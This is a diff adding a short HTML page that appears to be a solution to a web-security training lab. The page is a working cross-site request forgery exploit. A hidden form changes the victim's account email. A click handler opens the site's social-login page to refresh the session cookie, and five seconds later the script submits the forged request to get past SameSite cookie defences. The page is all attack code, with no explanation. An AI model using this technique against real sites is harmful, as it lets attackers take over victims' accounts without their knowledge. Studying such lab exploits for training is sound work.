@@ -1,0 +1,17 @@
+
+
+
+<form action="https://0a55005a04d31c298187617b002f00d2.web-security-academy.net/my-account/change-email" method="POST">
+    <input type="hidden" name="email" value="test4@test.ir"/>
+</form>
+<p>Click anywhere on the page</p>
+
+<script>
+    window.onclick = () => {
+        window.open('https://0a55005a04d31c298187617b002f00d2.web-security-academy.net/social-login');
+        setTimeout(changeEmail, 5000);
+    }
+    function changeEmail(){
+        document.forms[0].submit();
+    }
+</script>
